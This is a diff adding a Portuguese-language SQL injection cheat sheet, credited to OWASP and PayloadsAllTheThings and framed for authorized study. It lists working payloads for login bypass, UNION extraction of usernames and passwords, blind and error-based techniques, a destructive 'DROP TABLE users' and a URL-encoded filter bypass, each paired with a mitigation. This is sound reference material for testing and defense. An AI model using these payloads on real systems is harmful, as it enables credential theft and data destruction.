@@ -1,0 +1,17 @@
+# SQL Injection - cheatsheet de payloads (reimplementado de OWASP/PayloadsAllTheThings/sqlmap)
+# USO SOMENTE em sistemas proprios ou com autorizacao explicita. Fonte de estudo:
+#   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+#
+# PAYLOAD                                              | EFEITO                                  | MITIGACAO
+' OR '1'='1                                            | tautologia: casa com tudo (dump/bypass) | prepared statement
+' OR 1=1 --                                            | idem, comenta o resto da query          | prepared statement
+admin' --                                              | login como admin, ignora a senha        | prepared statement
+' UNION SELECT NULL,NULL --                            | descobre nº de colunas (ajuste NULLs)   | prepared statement
+' UNION SELECT username,password FROM users --         | exfiltra credenciais de outra tabela    | prepared statement + menor privilegio
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a  | blind booleano: 1 char por vez    | prepared statement
+' AND SLEEP(5) --                                      | blind por tempo (MySQL)                 | prepared statement
+'; SELECT pg_sleep(5) --                               | blind por tempo (PostgreSQL)            | prepared statement
+' AND 1=CONVERT(int,(SELECT @@version)) --             | error-based (SQL Server)                | erros genericos + prepared stmt
+1; DROP TABLE users --                                 | stacked queries (destrutivo)            | prepared stmt + menor privilegio
+' ORDER BY 1--  / ' ORDER BY <coluna> --               | ORDER BY injection (nao aceita bind)    | ALLOWLIST de colunas
+%27%20OR%20%271%27%3D%271                              | tautologia URL-encoded (bypass de filtro)| decodificar e parametrizar
